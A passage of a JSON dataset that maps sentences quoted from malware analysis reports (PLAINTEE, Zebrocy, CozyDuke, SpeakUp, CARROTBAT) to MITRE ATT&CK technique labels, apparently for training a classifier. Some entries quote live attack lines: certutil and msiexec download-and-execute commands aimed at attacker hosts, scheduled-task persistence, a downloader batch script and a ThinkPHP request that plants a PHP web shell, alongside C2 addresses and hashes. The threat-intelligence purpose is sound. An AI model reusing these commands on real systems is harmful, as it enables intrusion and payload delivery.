      "An exemplar command is given below:      1234567891011121314151617  cmd /c Echo CreateObject(\"WScript.Shell\").Run \"msiexec /q /ihttp:\\\\dlj40s.jdanief[.]xyz/images/word3.doc\",0>%userProfile%\\AppData\\Local\\Microsoft\\microsoft.vbs /c EchoCreateObject(\"WScript.Shell\").Run \"msiexec /q /ihttp:\\\\dlj40s.jdanief[.]xyz/images/word3.doc\",0>%userProfile%\\AppData\\Local\\Microsoft\\microsoft.vbsschtasks /create /sc MINUTE /tn \"Windows Scheduled MaintenBa\" /tr \"wscript%userProfile%\\AppData\\Local\\Microsoft\\microsoft.vbs\" /mo 10 /F /create /scMINUTE /tn \"Windows Scheduled MaintenBa\" /tr \"wscript%userProfile%\\AppData\\Local\\Microsoft\\microsoft.vbs\" /mo 10 /Fcmd /c certutil.exe -urlcache -split -fhttp:\\\\\\\\dlj40s.jdanief[.]xyz/images/1.pdf C:\\ProgramData\\1.pdf&startC:\\ProgramData\\1.pdf /c certutil.exe -urlcache -split -fhttp:\\\\\\\\dlj40s.jdanief[.]xyz/images/1.pdf C:\\ProgramData\\1.pdf&startC:\\ProgramData\\1.pdf     In the above command, the malware is downloading and executing a payload and configuring it for persistent execution"
    ]
  },
  "file and directory discovery remote file copy-multi": {
    "technique_names": [
      "file and directory discovery",
      "ingress tool transfer"
    ],
    "sentances": [
      "This plugin provides the attacker with the ability to both list files and download/upload files on the victim machine",
      "10 Ensuring the files have been downloaded After the malware is downloaded and files verified, the script will check in the C:\\Program Files\\ directory for the presence Avast antivirus, which happens to be the most common installed AV worldwide",
      "Amongst the downloaded files, \u00a0the fake .gif and .jpg files appear to be dependencies for the malware"
    ]
  },
  "proxy command-line interface-multi": {
    "technique_names": ["command and scripting interpreter"],
    "sentances": [
      "The plugin uses the same network protocol as PLAINTEE and so we were able to trivially decode further commands that were sent.\u00a0 The following commands were observed:  tasklist ipconfig /all  The attacker performed these two commands 33 seconds apart"
    ]
  },
  "file deletion remote file copy-multi": {
    "technique_names": [
      "indicator removal on host: file deletion",
      "ingress tool transfer"
    ],
    "sentances": [
      "Additional mitigations that could help to prevent attacks like these from succeeding in your environment include:  Changing the default handler for \u201c.hta\u201d files in your environment so that they cannot be directly executed.hta\u201d files in your environment so that they cannot be directly executed"
    ]
  },
  "custom cryptographic protocol binary padding system network configuration discovery exfiltration over alternative protocol pass the hash-multi": {
    "technique_names": [
      "encrypted channel",
      "obfuscated files or information: binary padding",
      "system network configuration discovery",
      "exfiltration over alternative protocol",
      "use alternate authentication material: pass the hash"
    ],
    "sentances": [
      "At least three variants of PLAINTEE have been identified to date, however, the following two samples have additional unique differences: \u00a0    Hash Functions Mutex   bcd37f1d625772c162350e5383903fe8dbed341ebf0dc38035be5078624c039e helloworld helloworld1,helloworld2,sqmAddTostream,DllEntryPoint microsoftfuckedup   6aad1408a72e7adc88c2e60631a6eee3d77f18a70e4eee868623588612efdd31    \u00a0 The following actions are performed with the additional functions:  helloworld \u2013 performs actions identical to the newer sample\u2019s \u2018Sub\u2019 function helloworld1 \u2013 accepts command-line arguments, performs a UAC bypass helloworld2 \u2013 drops and compiles a mof filemof file   sqmAddTostream \u2013 expected to run initially by the malware, checks OS version and loads the malware with helloworld2  Appendix B    Type Value Cluster   Loaders   Hash 0bb20a9570a9b1e3a72203951268ffe83af6dcae7342a790fe195a2ef109d855 B   Hash 1dc5966572e94afc2fbcf8e93e3382eef4e4d7b5bc02f24069c403a28fa6a458 B   Domain www.facebook-apps.com B   Domain dlj40s.jdanief.xyz B   IP 89.46.222.97 B   Hash a789a282e0d65a050cccae66c56632245af1c8a589ace2ca5ca79572289fd483 A   PLAINTEE   Hash 863a9199decf36895d5d7d148ce9fd622e825f393d7ebe7591b4d37ef3f5f677 A   Hash 22a5bd54f15f33f4218454e53679d7cfae32c03ddb6ec186fb5e6f8b7f7c098b A   Hash c35609822e6239934606a99cb3dbc925f4768f0b0654d6a2adc35eca473c505d B   IP 199.247.6.253 A   IP 45.76.176.236 A   Mutex microsoftfuckedupb A   Hash 9f779d920443d50ef48d4abfa40b43f5cb2c4eb769205b973b115e04f3b978f5 A   Hash bcd37f1d625772c162350e5383903fe8dbed341ebf0dc38035be5078624c039e A   Hash 6aad1408a72e7adc88c2e60631a6eee3d77f18a70e4eee868623588612efdd31 A   Hash b099c31515947f0e86eed0c26c76805b13ca2d47ecbdb61fd07917732e38ae78 A   Domain goole.authorizeddns.us A   Mutex Microsoftfuckedup A   IP 103.75.189.74 A   IP 131.153.48.146 A   DDKONG   Hash 15f4c0a589dff62200fd7c885f1e7aa8863b8efa91e23c020de271061f4918eb A   Domain microsoft.authorizeddns.us A   IP 103.75.191.177 A   Hash 0f102e66bc2df4d14dc493ba8b93a88f6b622c168e0c2b63d0ceb7589910999d A   Hash 84607a2abfd64d61299b0313337e85dd371642e9654b12288c8a1fc7c8c1cf0a A   Hash a725abb8fe76939f0e0532978eacd7d4afb4459bb6797ec32a7a9f670778bd7e A   Hash 82e1e296403be99129aced295e1c12fbb23f871c6fa2acafab9e08d9a728cb96 A   Hash 9996e108ade2ef3911d5d38e9f3c1deb0300aa0a82d33e36d376c6927e3ee5af A   Domain www.google_ssl.onmypc.org A   Hash 18e102201409237547ab2754daa212cc1454f32c993b6e10a0297b0e6a980823 A   IP 103.75.191.75 A   Hash c78fef9ef931ffc559ea416d45dc6f43574f524ba073713fddb79e4f8ec1a319 A   Hash 01315e211bac543195f2c703033ba31b229001f844854b147c4b2a0973a7d17b A   Hash b8528c8e325db76b139d46e9f29835382a1b48d8941c47060076f367539c2559 A   Hash df14de6b43f902ac8c35ecf0582ddb33e12e682700eb55dc4706b73f5aed40f6 A   Hash 177906cb9170adc26082e44d9ad1b3fbdcba7c0b57e28b614c1b66cc4a99f906 A   Hash 113ae6f4d6a2963d5c9a7f42f782b176da096d17296f5a546433f7f27f260895 A   Domain ftp.chinhphu.ddns.ms A   Hash 128adaba3e6251d1af305a85ebfaafb2a8028eed3b9b031c54176ca7cef539d2 A   Domain www.microsoft.https443.org A   IP 45.121.146.26 A   Hash 5afbee76af2a09c173cf782fd5e51b5076b87f19b709577ddae1c8e5455fc642 A   Domain msdns.otzo.com A   Hash 119572fafe502907e1d036cdf76f62b0308b2676ebdfc3a51dbab614d92bc7d0 A   Domain goole.authorizeddns.us A   IP 103.75.189.74 A"
    ]
  },
  "system network configuration discovery brute force-multi": {
    "technique_names": [
      "system network configuration discovery",
      "brute force"
    ],
    "sentances": [
      "The threat actor can now combine the information and brute force their way throughout the network (through NetBIOS) using a list of usernames and passwords as well as a range of IP addresses"
    ]
  },
  "execution through api application window discovery remote file copy windows admin shares-multi": {
    "technique_names": [
      "native api",
      "application window discovery",
      "ingress tool transfer",
      "remote services: smb/windows admin shares"
    ],
    "sentances": [
      "Features  TCP network stream (IPv4 & IPv6 support) Fast network serialization (Protocol Buffers) Compressed (QuickLZ) & Encrypted (TLS) communication Multi-Threaded UPnP Support No-Ip.com Support Visit Website (hidden & visible) Show Messagebox Task Manager File Manager Startup Manager Remote Desktop Remote Shell Download & Execute Upload & Execute System Information Computer Commands (Restart, Shutdown, Standby) Keylogger (Unicode Support) Reverse Proxy (SOCKS5) Password Recovery (Common Browsers and FTP Clients) Registry Editor  Supported runtimes and operating systems  .NET Framework 4.0 Client Profile or higher (Download) Supported operating systems (32- and 64-bit)  Windows XP SP3 Windows Server 2003 Windows Vista Windows Server 2008 Windows 7 Windows Server 2012 Windows 8/8.1 Windows 10    Compiling Open the project in Visual Studio 2017+ and restore the NuGET packages"
    ]
  },
  "file deletion scripting-multi": {
    "technique_names": [
      "indicator removal on host: file deletion",
      "command and scripting interpreter"
    ],
    "sentances": [
      "The White Atlas framework often utilized a small Javascript script to execute the malware dropper payload after it was decrypted by the VBA macro code, then to delete the dropper afterwards",
      "Finally, the malware executes the extracted install.bat script before deleting the original files and exiting"
    ]
  },
  "file deletion scripting obfuscated files or information-multi": {
    "technique_names": [
      "indicator removal on host: file deletion",
      "command and scripting interpreter",
      "obfuscated files or information"
    ],
    "sentances": [
      "A much more advanced and highly obfuscated Javascript script was utilized in White Atlas samples that dropped a Firefox extension backdoor developed by Turla, but again the script was responsible for the simple tasks of writing out the extension.json configuration file for the extension and deleting itself for cleanup purposes"
    ]
  },
  "account discovery launch agent-multi": {
    "technique_names": [
      "account discovery",
      "create or modify system process: launch agent"
    ],
    "sentances": [
      "However, we were able determine a unique, hard-coded user agent used for the C2 communications: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; InfoPath.1) Using AutoFocus, we pivoted from the user agent string to expand our data set to three additional Zebrocy samples using the exact same user agent"
    ]
  },
  "system owner/user discovery launch agent-multi": {
    "technique_names": [
      "system owner/user discovery",
      "create or modify system process: launch agent"
    ],
    "sentances": [
      "One sample in particular, cba5ab65a\u2026 used yet another unique user agent string in combination with the previous user agent for its C2: Mozilla v5.1 (Windows NT 6.1; rv:6.0.1) Gecko/20100101 Firefox/6.0.1 A malware sample using two separate unique user agent strings is uncommon",
      "Examining the use of the unique user agents\u2019 strings over time shows that while previously only the Mozilla/5.0 user agent was in use, since mid 2017 all three user agent strings have been used by the Zebrocy tool for its C2 communications"
    ]
  },
  "masquerading remote file copy-multi": {
    "technique_names": ["masquerading", "ingress tool transfer"],
    "sentances": [
      "The DDE instructions attempt to run the following the following command on the victim host, which attempts to download and execute a payload from a remote server:       C:\\\\Programs\\\\Microsoft\\\\MSOffice\\\\Word.exe\\\\..\\\\..\\\\..\\\\..\\\\Windows\\\\System32\\\\rundll32.exeC:\\\\Windows\\\\System32\\\\shell32.dll,ShellExec_RunDLLC:\\\\Windows\\\\System32\\\\cmd.exe /k certutil -urlcache -split -fhxxp://220.158.216[.]127/MScertificate.exe & MScertificate.exe\"     During our analysis, we observed this DDE downloading and executing a Zebrocy AutoIt downloader (f27836430\u2026), configured to attempt to download an additional payload from 220.158.216[.]127"
    ]
  },
  "standard application layer protocol deobfuscate/decode files or information fallback channels-multi": {
    "technique_names": [
      "application layer protocol",
      "deobfuscate/decode files or information",
      "fallback channels"
    ],
    "sentances": [
      "For instance, here are the resulting decrypted strings from each of the case statements (dd7e69e1\u2026): Case \u2013 String decrypted 1 \u2013 185.25.50[.]93 2 \u2013 POST http://185.25.50[.]93/syshelp/kd8812u/protocol.php HTTP/1.1\\r\\nHost: 185.25.50[.]93\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: 3 \u2013 porg= 4 \u2013 Content-Length: The Trojan uses raw sockets to communicate with its C2 server and uses the decrypted string above to create HTTP requests"
    ]
  },
  "execution through api deobfuscate/decode files or information-multi": {
    "technique_names": [
      "native api",
      "deobfuscate/decode files or information"
    ],
    "sentances": [
      "The Trojan will convert these hexadecimal bytes to their binary values and write them to a file and will run the file using the \u201copen\u201d function using the ShellExecuteW API function",
      "The payload then sets EIP to the entry point of the newly injected code using the SetThreadContext API, and finally calls the NtAlertResumeThread API function to run the injected code"
    ]
  },
  "masquerading scripting data encrypted-multi": {
    "technique_names": [
      "masquerading",
      "command and scripting interpreter",
      "data encrypted for impact"
    ],
    "sentances": [
      "For instance, the following data exists within a resource: fb 70 b0 c9 bd c5 8a d4 0c 54 fd 4c 6d bb f0 0f By multiplying each byte with -1, we obtain the following data: 05 90 50 37 43 3b 76 2c f4 ac 03 b4 93 45 10 f1 After using RC4 and the key 14331d289e737093994395d3fc412afc, the following cleartext data appears: \\x00\\x00\\x00\\x00FlashRun.vbs We do not see the payload using this FlashRun.vbs filename, instead it uses a temporary file name to store an embedded VBScript file, such as %Temp%\\4.tmp\\5.vbs"
    ]
  },
  "command-line interface exploitation for client execution-multi": {
    "technique_names": [
      "command and scripting interpreter",
      "exploitation for client execution"
    ],
    "sentances": [
      "The exploitation is issued in three steps:  Exploiting CVE-2018-20062 for uploading a PHP shell  Using a GET request, a remote command execution vulnerability in ThinkPHP (CVE-2018-20062) is sent to the targeted server, as shown below: s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo ^<? php $action = $_GET[\u2018module\u2019];system($action);? ^>>index.php This shell executes commands sent via the \u201cmodule\u201d parameter in a query"
    ]
  },
  "exploitation for client execution remote file copy-multi": {
    "technique_names": [
      "exploitation for client execution",
      "ingress tool transfer"
    ],
    "sentances": [
      "f) Hadoop YARN ResourceManager \u2013 Command Execution (exploit) g) CVE-2016-3088: Apache ActiveMQ Fileserver File Upload Remote Code Execution Vulnerability"
    ]
  },
  "screen capture obfuscated files or information-multi": {
    "technique_names": ["screen capture", "obfuscated files or information"],
    "sentances": [
      "Figures 8 and 9: LiteHTTP screenshots taken from the user`s profile in which the acronym \u201cKnock\u201d appears Conclusion SpeakUp`s obfuscated payloads and propagation technique is beyond any doubt the work of a bigger threat in the making"
    ]
  },
  "execution through api deobfuscate/decode files or information command-line interface scripting exploitation for client execution remote file copy service execution-multi": {
    "technique_names": [
      "native api",
      "deobfuscate/decode files or information",
      "command and scripting interpreter",
      "command and scripting interpreter",
      "exploitation for client execution",
      "ingress tool transfer",
      "system services: service execution"
    ],
    "sentances": [
      "The Check Point IPS blade provides protections against these threats:  Command Injection Over HTTP NoneCMS ThinkPHP Remote Code Execution (CVE-2018-20062) Oracle WebLogic WLS Security Component Remote Code Execution (CVE-2017-10271) Oracle WebLogic WLS Server Component Arbitrary File Upload(CVE-2018-2894) Hadoop YARN ResourceManager Remote Command Execution Apache ActiveMQ Fileserver Multi Methods Directory Traversal(CVE-2016-3088) JBoss Seam 2 Framework Remote Code Execution (CVE-2010-1871) JBoss Enterprise Application Platform Invoker Servlets Remote Code Execution (CVE-2012-0874) Red Hat JBoss AS Remote Code Execution Suspicious Linux Shell Downloader  The Check Point Anti-Bot blade provides protections against this threat:  Linux.SpeakUp  IOCs Md5: SpeakUp Scripts:     0a4e5831a2d3115acb3e989f0f660a6f   0b5e1eb67be7c3020610b321f68375c1   968d1906be7eb8321a3afac5fde77467   074d7a4417d55334952d264c0345d885   f357f32d7c2ddfef4b5850e7506c532b   b6311bffcea117dceac5ccac0a243ae5   2adf4e4512aaafab75e8411aa7121ffa   a73c7b777d31b0a8ef270809e2ed6510   114cda60d215e44baeef22b7db0c64d5   8f725fc5406ebf679c5c7ade3e8d5f70   4a80a075c7c6b5e738a7f4b60b7b101f   e18749e404baec2aa29f4af001164d1b   1a377b5d5d2162327f0706cc84427780   1da94e156609d7e880c413a124bad004   713260a53eff05ad44aad8d6899f1c6e   36cda3c77ba380d6388a01aafcbaa6c7   0f83482368343f5c811bac84a395d2c0   8dd6cb5f33d25512805c70bd3db5f433   e4ca1e857034cbe0428d431c15ec8608   36502273cee61825dc97d62a3dffe729   f16c5a6342ccc253b1de177d3fa310b1   08d7674532cc226931570e6a99d5ba30   279c4aa955085480f3ad0c19aa36a93b    XMRig Miners: f79be3df4cbfe81028040796733ab07f a21a3d782d30b51515834a7bf68adc8e c572a10ca12f3bd9783c6d576aa080fb b60ec230644b740ca4dd6fd45059a4be 5e6b6fcd7913ae4917b0cdb0f09bf539 ae875c496535be196449547a15205883 068d424a1db93ec0c1f90f5e501449a3 996e0c8190880c8bf1b8ffb0826cf30f C&Cs:    67[.]209.177.163   173[.]82.104.196   5[.]196.70.86   120[.]79.247.183   5[.]2.73.127/lnsqqFE2jK/pprtnp153WWW.php   Speakupomaha[.]com/misc/ui/images/Indxe.php   Linuxservers[.]000webhostapp[.]com/hp.html   linuxsrv134[.]xp3[.]biz    Monero Wallets: 47UW2Qv7AB4CsD8L5WWSvx58ztrzHhcMeYN7AJry9aMZhGDLXGwBHLv8LpaDUxpmdWfqbbfrqpdieQAeVSMCU1qY4BFABPY 4Aa3TcU7ixMVcYwbsw8ENVbFwt4ZuqrNBVij5TRvPCTpGRK5BKBHQPu7ahT7z2A6547a5Lcn7yPZV1xU22ZbviqxUX7JVuP 4An3Radh69LgcTHJf1U3awa9ffej4b6DcUmEv8wirsDm8zRMSjifrwybH2AzHdEsW8eew3rFtk4QbGJMxqitfxmZJhABxpT"
    ]
  },
  "peripheral device discovery account discovery-multi": {
    "technique_names": ["peripheral device discovery", "account discovery"],
    "sentances": [
      "Watch on\u00a0Fox News: Hackers may use fake Netflix app to spy on\u00a0users As users have become more attached to their mobile devices, they want everything on those devices"
    ]
  },
  "screen capture file and directory discovery commonly used port-multi": {
    "technique_names": [
      "screen capture",
      "file and directory discovery",
      "non-standard port"
    ],
    "sentances": [
      "SpyNote RAT is capable of performing a variety of alarming functions that\u00a0includes:   Activating the device\u2019s microphone and listening to live\u00a0conversations  Executing commands on the\u00a0device  Copying files from the device to a Command & Control (C&C)\u00a0center  Recording screen\u00a0captures  Viewing\u00a0contacts  Reading SMS\u00a0messages  The screenshot below shows part of the sandbox\u2019s report on the SpyNote RAT\u2019s signature and detected\u00a0functions:          Figure 1 :\u00a0Zscaler Cloud Sandbox\u00a0Detection     The fake Netflix app we are analyzing in this blog appears to be built using an updated version of SpyNote RAT builder, which was\u00a0leaked last\u00a0year"
    ]
  },
  "screen capture command-line interface-multi": {
    "technique_names": ["screen capture", "command and scripting interpreter"],
    "sentances": [
      "The following screenshot shows the command execution functionality in action: \u00a0          Figure 4:\u00a0Command\u00a0Execution     The\u00a0paramString\u00a0parameter shown in the above screenshot\u00a0can be any command received from C&C"
    ]
  },
  "account discovery network service scanning-multi": {
    "technique_names": ["account discovery", "network service discovery"],
    "sentances": [
      "It can be used to execute files as a different user, move, and delete files locally, schedule remote AT jobs, perform host discovery on connected networks, scan for open ports on hosts in a connected network, and retrieve information about the OS, users, groups, and shares on remote hosts"
    ]
  },
  "input capture remote file copy-multi": {
    "technique_names": ["input capture", "ingress tool transfer"],
    "sentances": [
      "This is a classic RAT that can download, upload, execute commands on the victim host and, finally, perform keylogging"
    ]
  },
  "data staged remote file copy-multi": {
    "technique_names": ["data staged", "ingress tool transfer"],
    "sentances": [
      "Interestingly, the attacker has used the >> method to append to the file so there can be multiple outputs written to their single TMP file: \"C:\\Windows\\system32\\cmd.exe\" /C systeminfo >> \"C:\\Ahnlab\\$$$A24F.TMP\"  \"C:\\WINDOWS\\system32\\cmd.exe\" /C tasklist /v >> \"C:\\Ahnlab\\$$$A24F.TMP\"   NavRAT   Capabilities  NavRAT is a remote access trojan (RAT) designed to upload, download and execute files"
    ]
  },
  "file and directory discovery data staged remote file copy-multi": {
    "technique_names": [
      "file and directory discovery",
      "data staged",
      "ingress tool transfer"
    ],
    "sentances": [
      "The log files mentioned previously are stored in the same directory as NavRAT on the victim machine, again making it easy for us to find and analyse the additional log files"
    ]
  },
  "masquerading video capture-multi": {
    "technique_names": ["masquerading", "video capture"],
    "sentances": [
      "68271df868f462c06e24a896a9494225,Office Monkeys LOL Video.zip Believe it or not, recipients in bulk run the file within: 95b3ec0a4e539efaa1faa3d4e25d51de,Office Monkeys (Short Flash Movie).exe This file in turn drops two executables to %temp%: 2aabd78ef11926d7b562fd0d91e68ad3, Monkeys.exe 3d3363598f87c78826c859077606e514, player.exe It first launches Monkeys.exe, playing a self-contained, very funny video of white-collar tie wearing chimpanzees working in a high rise office with a human colleague"
    ]
  },
  "security software discovery masquerading-multi": {
    "technique_names": [
      "software discovery: security software discovery",
      "masquerading"
    ],
    "sentances": [
      "It then launches player.exe, a CozyDuke dropper maintaining anti-detection techniques: 3d3363598f87c78826c859077606e514,player.exe,338kb,Trojan.Win32.CozyBear.v,CompiledOn:2014.07.02 21:13:33 Anti-detection and trojan functionality The file collects system information, and then invokes a WMI instance in the root\\securitycenter namespace to identify security products installed on the system, meaning that this code was built for x86 systems, wql here: SELECT * FROM AntiVirusProduct SELECT * FROM FireWallProduct The code hunts for several security products to evade: CRYSTAL KASPERSKY SOPHOS DrWeb AVIRA COMODO Dragon In addition to the WMI/wql use, it also hunts through the \u201cSOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\\u201d registry key looking for security products to avoid"
    ]
  },
  "code signing file and directory discovery-multi": {
    "technique_names": [
      "subvert trust controls: code signing",
      "file and directory discovery"
    ],
    "sentances": [
      "Following these checks, it drops several more malware files signed with the pasted AMD digital signature to a directory it creates"
    ]
  },
  "code signing obfuscated files or information-multi": {
    "technique_names": [
      "subvert trust controls: code signing",
      "obfuscated files or information"
    ],
    "sentances": [
      "Executable-Signing Certificates Samples are usually signed with a fake certificate \u2013 we\u2019ve seen two instances, one AMD and one Intel:  Configuration files: Some of the malware uses an encrypted configuration file which is stored on disk as \u201cracss.dat\u201d"
    ]
  },
  "process injection rundll32-multi": {
    "technique_names": [
      "process injection",
      "system binary proxy execution: rundll32"
    ],
    "sentances": [
      "ChromeUpdate.exe starts the file with \u201crundll32 cache.dll,ADB_Setup\u201d Cache.dll analysis  Cache.dll was written in C/C++ and built with a Microsoft compiler"
    ]
  },
  "data from local system deobfuscate/decode files or information exfiltration over command and control channel-multi": {
    "technique_names": [
      "data from local system",
      "deobfuscate/decode files or information",
      "exfiltration over c2 channel"
    ],
    "sentances": [
      "Cache.dll code flow overview RC4 decrypt hardcoded c2 and urls resolve hidden function calls collect identifying victim system data encrypt collected data send stolen data to c2 and retrieve commands Cache.dll code details Structurally, \u201cCache.dll\u201d is a fairly large backdoor at 425KB"
    ]
  },
  "execution through api deobfuscate/decode files or information system network configuration discovery-multi": {
    "technique_names": [
      "native api",
      "deobfuscate/decode files or information",
      "system network configuration discovery"
    ],
    "sentances": [
      "The code then decodes this set of import symbols and resolves addresses for its networking and data stealing functionality: InternetCloseHandle InternetReadFile HttpSendRequestA HttpOpenRequestA HttpQueryInfoA InternetConnectA InternetCrackUrlA InternetOpenA InternetSetOptionW GetAdaptersInfo Much like the prior office monkey \u201catiumdag.dll\u201d component, this code collects identifying system information using standard win32 API calls: Computer name \u2013 GetComputerNameW User name \u2013 GetUserNameW Adapter GUID, ip address, mac address \u2013 GetAdaptersInfo Windows version \u2013 GetVersionExW It then uses the runtime resolved networking API calls to send the collected data back to a hardcoded c2 and set of urls"
    ]
  },
  "execution through api account discovery-multi": {
    "technique_names": ["native api", "account discovery"],
    "sentances": [
      "Cache.dll connectback urls: 209.200.83.43/ajax/links.php 209.200.83.43/ajax/api.php 209.200.83.43/ajax/index.php 209.200.83.43/ajax/error.php 209.200.83.43/ajax/profile.php 209.200.83.43/ajax/online.php 209.200.83.43/ajax/loader.php 209.200.83.43/ajax/search.php Observed user-agent string on the wire, but it\u2019s dynamically generated based on the Windows system settings (retrieved using standard win32 api \u201cObtainUserAgentString\u201d): \u201cUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)\u201d Communications with the CozyDuke C2 include key/value pairs passed as URL parameters"
    ]
  },
  "spearphishing link security software discovery file and directory discovery exfiltration over alternative protocol brute force commonly used port-multi": {
    "technique_names": [
      "phishing: spearphishing link",
      "software discovery: security software discovery",
      "file and directory discovery",
      "exfiltration over alternative protocol",
      "brute force",
      "non-standard port"
    ],
    "sentances": [
      "Related MD5s 62c4ce93050e48d623569c7dcc4d0278, 2537.ex_ a5d6ad8ad82c266fda96e076335a5080, drop1.ex_ 93176df76e351b3ea829e0e6c6832bdf, drop1.pd_ 7688be226b946e231e0cd36e6b708d20, 8.zip fd8e27f820bdbdf6cb80a46c67fd978a, doc853.ex_ 93176df76e351b3ea829e0e6c6832bdf, doc853.pdf 9ad55b83f2eec0c19873a770b0c86a2f, reader_sl.ex_ f16dff8ec8702518471f637eb5313ab2 1.ex_ 8670710bc9477431a01a576b6b5c1b2a 93176df76e351b3ea829e0e6c6832bdf, dropped\\hppscan854.pdf f58a4369b8176edbde4396dc977c9008, dropped\\reader_sl.ex_ 83f57f0116a3b3d69ef7b1dbe9943801 b5553645fe819a93aafe2894da13dae7 acffb2823fc655637657dcbd25f35af8 1a42acbdb285a7fba17f95068822ea4e d543904651b180fd5e4dc1584e639b5e d7af9a4010c75af6756a603fd6aef5a4 93176df76e351b3ea829e0e6c6832bdf, 3852.pdf f2b05e6b01be3b6cb14e9068e7a66fc1, dropped\\reader_sl.ex_ 57a1f0658712ee7b3a724b6d07e97259, dropped\\3852.ex_ 93176df76e351b3ea829e0e6c6832bdf, 5463.pdf eb22b99d44223866e24872d80a4ddefd, dropped\\5463\\reader_sl.ex_ 90bd910ee161b71c7a37ac642f910059, dropped\\5463.ex_ 1a262a7bfecd981d7874633f41ea5de8 98a6484533fa12a9ba6b1bd9df1899dc 7f6bca4f08c63e597bed969f5b729c56 08709ef0e3d467ce843af4deb77d74d5 Related CozyDuke C&Cs: 121.193.130.170:443/wp-ajax.php 183.78.169.5:443/search.php 200.119.128.45:443/mobile.php 200.125.133.28:443/search.php 200.125.142.11:443/news.php 201.76.51.10:443/plugins/json.php 202.206.232.20:443/rss.php 202.76.237.216:443/search.php 203.156.161.49:443/plugins/twitter.php 208.75.241.246:443/msearch.php 209.40.72.2:443/plugins/fsearch.php 210.59.2.20:443/search.php 208.77.177.24:443/fsearch.php www.getiton.hants.org.uk:80/themes/front/img/ajax.php www.seccionpolitica.com.ar:80/galeria/index.php 209.200.83.43/ajax/links.php 209.200.83.43/ajax/api.php 209.200.83.43/ajax/index.php 209.200.83.43/ajax/error.php 209.200.83.43/ajax/profile.php 209.200.83.43/ajax/online.php 209.200.83.43/ajax/loader.php 209.200.83.43/ajax/search.php Appendix: Parallel and Previous Research The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor, Securelist, Feb 2013Miniduke is back: Nemesis Gemina and the Botgen Studio, Securelist, July 2014MiniDuke 2 (CosmicDuke), CrySyS, July 2014COSMICDUKE Cosmu with a twist of MiniDuke [pdf], F-Secure, September 2014THE CASE OF THE MODIFIED BINARIES, Leviathan Security, October 2014A word on CosmicDuke, Blaze\u2019s Security Blog, September 2014OnionDuke: APT Attacks Via the Tor Network, F-Secure, November 2014The Connections Between MiniDuke, CosmicDuke and OnionDuke, F-Secure, January 2015 Kaspersky Lab products detect the malware used by the CozyDuke threat actor as: HEUR:Trojan.Win32.CozyDuke.gen Trojan.Win32.CozyBear.*"
    ]
  },
  "standard application layer protocol exfiltration over alternative protocol-multi": {
    "technique_names": [
      "application layer protocol",
      "exfiltration over alternative protocol"
    ],
    "sentances": [
      "These samples communicated with the following hosts via FTP for C2 communication:  ftp.byethost7[.]com ftp.byethost10[.]com files.000webhost[.]com  Beginning in June 2018, we observed the OceanSalt malware family being dropped by CARROTBAT"
    ]
  },
  "standard application layer protocol rundll32-multi": {
    "technique_names": [
      "application layer protocol",
      "system binary proxy execution: rundll32"
    ],
    "sentances": [
      "In this particular instance, the following script is retrieved:@echo off  :if exist \"%PROGRAMFILES(x86)%\" (GOTO 64BITOS) ELSE (GOTO 32BITOS)  :32BITOS certutil -urlcache -split -f http://s8877.1apps[.]com/vip/setup.txt > nul certutil -decode -f setup.txt setup.cab > nul del /f /q setup.txt > nul GOTO ISEXIST  :64BITOS :certutil -urlcache -split -f http://s8877.1apps[.]com/vip/setup2.txt > nul :certutil -d^ecode -f setup2.txt setup.cab > nul :del /f /q setup2.txt > nul :GOTO ISEXIST  :ISEXIST  if exist \"setup.cab\" (GOTO EXECUTE) ELSE (GOTO EXIT)  :EXECUTE ver | findstr /i \"10\\.\" > nul IF %ERRORLEVEL% EQU 0 (GOTO WIN10) ELSE (GOTO OTHEROS)  :WIN10 expand %TEMP%\\setup.cab -F:* %CD% > nul :if exist \"%PROGRAMFILES(x86)%\" (rundll32 %TEMP%\\drv.dll EntryPoint) ELSE (rundll32 %TEMP%\\drv.dll EntryPoint) %TEMP%\\install.bat GOTO EXIT  :OTHEROS wusa %TEMP%\\setup.cab /quiet /extract:%TEMP% > nul %TEMP%\\install.bat GOTO EXIT  :EXIT del /f /q setup.cab > nul del /f /q %~dpnx0 > nulThis script simply checks the operating system of the victim and downloads the respective payload again using the certutil executable"
    ]
  },
  "masquerading file and directory discovery scripting remote file copy-multi": {
    "technique_names": [
      "masquerading",
      "file and directory discovery",
      "command and scripting interpreter",
      "ingress tool transfer"
    ],
    "sentances": [
      "Figure 8 CARROTBAT downloading final payload via certutil \u00a0 The downloaded CAB file has the following properties:    MD5 a943e196b83c4acd9c5ce13e4c43b4f4   SHA1 e66e416f300c7efb90c383a7630c9cfe901ff9fd   SHA256 cfe436c1f0ce5eb7ac61b32cd073cc4e4b21d5016ceef77575bef2c2783c2d62   File Type Microsoft Cabinet archive data, 181248 bytes, 3 files    \u00a0 The following three files and their descriptions are dropped by this CAB file: \u00a0    Filename Purpose   Install.bat Installation batch script responsible for copying the other files to C:\\Users\\Public\\Downloads and setting the Run registry key to ensure persistence"
    ]
  },
  "spearphishing link standard application layer protocol exfiltration over alternative protocol-multi": {
    "technique_names": [
      "phishing: spearphishing link",
      "application layer protocol",
      "exfiltration over alternative protocol"
    ],
    "sentances": [
